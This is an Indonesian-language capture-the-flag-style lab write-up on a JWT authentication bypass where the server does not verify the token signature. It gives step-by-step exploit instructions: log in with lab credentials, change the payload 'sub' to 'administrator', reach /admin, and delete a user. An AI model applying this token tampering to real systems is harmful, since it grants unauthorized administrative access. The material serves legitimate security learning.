# JWT Authentication Bypass via Unverified Signature

## Konsep

Normal:

```text
Ubah JWT
↓
Signature rusak
↓
Server cek signature
↓
401
```

Bug:

```text
Ubah JWT
↓
Signature rusak
↓
Server TIDAK cek signature 😭
↓
JWT tetap diterima
```

Inti bug:

> Server menerima JWT tanpa memverifikasi signature sama sekali.

---

### Bedanya dengan `alg:none`

`alg:none`

```text
Attacker:
ubah alg → none
↓
Server skip verify
```

Unverified Signature:

```text
Server dari awal memang tidak verify signature
```

Jadi:

```text
Tidak perlu:
ubah alg
hapus signature
sign ulang
```

---

# Langkah Exploit

## 1. Login

Login:

```text
wiener:peter
```

Ambil JWT:

```text
GET /my-account
```

---

## 2. Coba akses admin

Kirim:

```text
GET /admin
```

Respon:

```text
401 Unauthorized
```

Artinya:

```text
Butuh:
sub=administrator
```

---

## 3. Edit Payload

Awal:

```json
{
 "sub":"wiener"
}
```

Ubah:

```json
{
 "sub":"administrator"
}
```

Apply changes.

---

## 4. Kirim Request

Kirim:

```text
GET /admin
```

Walaupun:

```text
Signature rusak ❌
```

Server:

```text
Tidak cek signature 😭
↓
Baca:
sub=administrator
↓
Admin access
```

Respon:

```text
200 OK
```

---

## 5. Delete Carlos

Cari:

```text
/admin/delete?username=carlos
```

Kirim request.

Lab solved.

---

# Cara Server Memproses

Normal:

```text
JWT
↓
Verify signature
↓
Valid?
↓
Baca payload
```

Bug:

```text
JWT
↓
Langsung baca payload 😭
↓
sub=administrator
↓
Admin
```

---

# Hafalan Cepat

```text
Login
↓
sub=administrator
↓
Signature rusak
↓
Server cuek 😭
↓
Admin
```

---

# Inti Lab

> Unverified Signature = server percaya isi JWT meskipun signature salah.
